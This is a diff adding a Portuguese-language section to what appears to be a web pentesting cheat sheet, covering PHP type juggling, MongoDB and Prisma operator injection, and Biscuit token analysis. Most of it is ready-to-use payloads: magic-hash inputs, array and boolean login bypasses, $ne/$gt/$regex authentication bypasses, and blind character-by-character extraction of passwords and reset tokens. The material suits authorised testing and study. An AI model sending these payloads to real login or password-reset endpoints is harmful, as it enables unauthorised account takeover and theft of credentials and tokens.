@@ -2254,3 +2254,333 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt \
 > **Regra de ouro:** Comece pelo bypass mais simples (encoding) e vá escalando a complexidade. Cada WAF tem fraquezas diferentes — o que funciona no ModSecurity pode não funcionar no Cloudflare e vice-versa. Teste, observe, adapte.
 
 ---
+
+# 🃏 Type Juggling / Type Confusion / Biscuit
+
+## 🃏 Type Juggling — PHP Loose Comparison
+
+> Explorando a comparação frouxa `==` do PHP. Ver teoria em [[Essential Web Hacking]]
+
+### Detecção — Testar se a aplicação é PHP e usa ==
+```
+# Enviar como senha o número 0 (integer)
+password=0
+
+# Enviar via JSON com boolean true
+{"password": true}
+{"password": 1}
+
+# Enviar array para quebrar funções como strcmp()
+password[]=qualquercoisa
+username[]=admin&password[]=x
+```
+
+### Magic Hashes — MD5 (começa com 0e)
+```
+# Inputs cujo MD5 começa com 0e (PHP trata como 0 == 0)
+240610708       → MD5: 0e462097431906509019562988736854
+QNKCDZO         → MD5: 0e830400451993494058024219903391
+aabg74350       → MD5: 0e330537018876824769549624526900
+aabh258748      → MD5: 0e001790671690001560142393098088
+
+# Inputs cujo SHA1 começa com 0e
+aaroZmOk        → SHA1: 0e66507019969427134894567494305185566735
+aaK1STfY        → SHA1: 0e76658526655756207688271159624026011393
+```
+
+### Magic Hashes — SHA256 / MD5 com tipo
+```
+# Bypass de verificação de senha quando hash é comparado com ==
+# Se o sistema armazena: MD5("senha_certa") e compara com ==
+# Basta encontrar uma string cujo MD5 também comece com "0e" seguido de dígitos
+
+# Ferramenta: gerar magic hashes com script Python
+python3 -c "
+import hashlib, itertools, string
+for i in range(1000000):
+    h = hashlib.md5(str(i).encode()).hexdigest()
+    if h.startswith('0e') and h[2:].isdigit():
+        print(f'{i} -> {h}')
+        break
+"
+```
+
+### Bypass via JSON — Enviar tipos diferentes
+```json
+// Onde a aplicação espera string, enviar outros tipos:
+{"password": true}
+{"password": 0}
+{"password": null}
+{"password": []}
+{"password": false}
+
+// Para campos de ID/token:
+{"token": 0}
+{"id": true}
+{"role": true}
+```
+
+### Bypass via PHP Array (quebrar strcmp/hash_equals)
+```
+# Via formulário POST
+username=admin&password[]=
+username[]=admin&password[]=
+token[]=qualquer
+
+# Via Burp Suite — mudar Content-Type para application/x-www-form-urlencoded
+# e adicionar [] ao campo
+```
+
+---
+
+## 🔤 Typo Juggling — Casos Específicos PHP
+
+> Exploração de valores "falsy" e coerções específicas. Ver teoria em [[Essential Web Hacking]]
+
+### Payloads com valores falsy
+```
+# String "0" — falsy em PHP
+token=0
+token=0.0
+token=0e0
+token=   (espaço)
+
+# null byte
+token=%00
+
+# String que vira 0 em comparação numérica
+token=abc     # "abc" == 0  → true (PHP < 8.0)
+token=xyz123  # "xyz" == 0  → true (PHP < 8.0)
+```
+
+### Testar comportamento de empty() vs isset()
+```php
+# Valores que passam em empty() mas existem:
+valor = "0"     → empty("0") == true  (falsy!)
+valor = ""      → empty("") == true
+valor = 0       → empty(0) == true
+valor = null    → empty(null) == true
+valor = []      → empty([]) == true
+valor = false   → empty(false) == true
+
+# Implicação: se a validação usa empty() para checar token/senha → bypassável com "0"
+```
+
+### Comparações que explorar (PHP < 8.0)
+```
+# Testar via Burp Intruder com lista de valores
+0
+false
+null
+""
+"0"
+"0.0"
+" "
+"false"
+"null"
+"undefined"
+[]
+```
+
+---
+
+## 🌀 Type Confusion Attack — ORM MongoDB/Mongoose
+
+> Injeção de objetos de operador onde strings são esperadas. Ver teoria em [[Essential Web Hacking]]
+
+### Bypass de autenticação — Via JSON
+```json
+// Estrutura legítima:
+{"username": "admin", "password": "senha123"}
+
+// Bypass com $ne (not equal):
+{"username": "admin", "password": {"$ne": null}}
+{"username": "admin", "password": {"$ne": ""}}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+
+// Bypass com $gt (greater than):
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+
+// Bypass com $exists:
+{"username": {"$exists": true}, "password": {"$exists": true}}
+
+// Bypass combinado:
+{"username": {"$ne": "nada"}, "password": {"$ne": "nada"}}
+```
+
+### Bypass via URL (form-urlencoded)
+```
+# Equivalente ao $ne via query string
+username[$ne]=nada&password[$ne]=nada
+username[$gt]=&password[$gt]=
+username[$gte]=&password[$gte]=
+username[$regex]=.*&password[$regex]=.*
+username[$exists]=true&password[$exists]=true
+```
+
+### Extração blind via $regex (caractere por caractere)
+```json
+// Descobrir o username — testar cada letra inicial
+{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
+{"username": {"$regex": "^ad"}, "password": {"$ne": ""}}
+{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}
+{"username": {"$regex": "^admi"}, "password": {"$ne": ""}}
+{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
+
+// Descobrir senha da mesma forma
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^ab"}}
+```
+
+### Bypass de reset de senha / verificação de token
+```json
+// Endpoint: POST /api/reset-password {"token": "TOKEN_AQUI"}
+// Bypass:
+{"token": {"$ne": null}}
+{"token": {"$ne": ""}}
+{"token": {"$gt": ""}}
+{"token": {"$exists": true}}
+{"token": {"$regex": ".*"}}
+```
+
+### Headers necessários no Burp Suite
+```
+Content-Type: application/json
+# O body parser precisa receber JSON para aceitar os objetos!
+# Se Content-Type for application/x-www-form-urlencoded, usar sintaxe de array:
+# token[$ne]=nada
+```
+
+---
+
+## 🌀 Type Confusion Attack — ORM Prisma
+
+> Injeção de operadores Prisma onde strings são esperadas. Ver teoria em [[Essential Web Hacking]]
+
+### Bypass de autenticação
+```json
+// Endpoint espera: {"email": "user@site.com"}
+// Bypass com "not":
+{"email": {"not": ""}}
+{"email": {"not": null}}
+
+// Bypass com "contains":
+{"email": {"contains": ""}}
+{"email": {"contains": "@"}}
+
+// Bypass com "gt":
+{"email": {"gt": ""}}
+```
+
+### Bypass de verificação de token (Prisma)
+```json
+// Endpoint: POST /api/verify {"token": "TOKEN_AQUI"}
+// Bypass:
+{"token": {"not": ""}}
+{"token": {"not": null}}
+{"token": {"gt": ""}}
+{"token": {"contains": ""}}
+{"token": {"startsWith": ""}}
+{"token": {"endsWith": ""}}
+```
+
+### Extração blind via startsWith/endsWith (Prisma)
+```json
+// Extrair token de reset de senha caractere por caractere
+{"token": {"startsWith": "a"}}   // Retorna dados? Começa com 'a'!
+{"token": {"startsWith": "ab"}}  // Retorna dados? Começa com 'ab'!
+{"token": {"startsWith": "abc"}} // Continue até não retornar...
+
+// Ou via endsWith para o final do token
+{"token": {"endsWith": "z"}}
+{"token": {"endsWith": "yz"}}
+```
+
+### Testar quais operadores são aceitos
+```json
+// Enviar um por um e observar o comportamento da resposta:
+{"campo": {"not": "x"}}
+{"campo": {"contains": "x"}}
+{"campo": {"startsWith": "x"}}
+{"campo": {"endsWith": "x"}}
+{"campo": {"gt": "x"}}
+{"campo": {"gte": "x"}}
+{"campo": {"lt": "z"}}
+{"campo": {"lte": "z"}}
+{"campo": {"in": ["x", "y"]}}
+{"campo": {"notIn": ["x"]}}
+```
+
+---
+
+## 🍪 Biscuit Token — Análise e Manipulação
+
+> Token de autorização baseado em Ed25519 + Datalog. Ver teoria em [[Essential Web Hacking]]
+
+### Identificar um Biscuit Token
+```
+# Biscuit tokens têm um formato específico — geralmente começam com "En"
+# e são uma string base64url longa
+# Exemplo de onde encontrar: header Authorization, cookie, parâmetro de URL
+
+# Verificar se é um Biscuit (não um JWT — JWT tem 3 partes separadas por .)
+echo "TOKEN_AQUI" | base64 -d | xxd | head   # JWT começa com '{"alg"'
+# Biscuit é binário serializado (protobuf), não JSON legível diretamente
+```
+
+### Inspecionar conteúdo do token
+```bash
+# Via biscuit-cli (instalar via Rust/cargo)
+cargo install biscuit-cli
+
+# Inspecionar o token
+biscuit inspect TOKEN_AQUI
+
+# Saída esperada:
+# Block 0 (authority):
+#   user("gabriel");
+#   role("admin");
+#   check if time($t), $t < 2024-01-01T00:00:00Z;
+```
+
+### Atenuar (criar versão mais restrita)
+```bash
+# Criar token com permissões menores (a partir de um token existente)
+biscuit attenuate TOKEN_AQUI << 'EOF'
+check if role("user");
+EOF
+
+# Adicionar expiração
+biscuit attenuate TOKEN_AQUI << 'EOF'
+check if time($t), $t < 2025-12-31T23:59:59Z;
+EOF
+```
+
+### Analisar policies para encontrar brechas
+```datalog
+// Se a policy é:
+allow if user($u), role($r), $r == "admin";
+
+// E você controla um bloco, testar:
+// — Adicionar fato user("admin") no seu bloco atenuado
+// — Verificar se a policy valida o bloco autoridade ou qualquer bloco
+
+// Exemplo de bypass tentativo (depende da implementação):
+// Se a app valida "qualquer bloco tem role admin":
+// → Adicionar check if role("admin") no bloco de atenuação
+
+// Se a app valida apenas o bloco autoridade:
+// → Não é bypassável sem a chave privada
+```
+
+### Checklist de análise de Biscuit
+```
+[ ] 1. Identificar onde o token está sendo transmitido (cookie/header/url)
+[ ] 2. Inspecionar com biscuit inspect — ver os facts e checks
+[ ] 3. Verificar se há expiração (check if time...)
+[ ] 4. Analisar quais facts são necessários para a autorização
+[ ] 5. Verificar se o servidor valida apenas o bloco autoridade
+[ ] 6. Se tiver acesso ao código: checar como as policies são definidas
+[ ] 7. Testar reutilização do token em outros endpoints
+[ ] 8. Testar token expirado (se não há check if time...)
+```
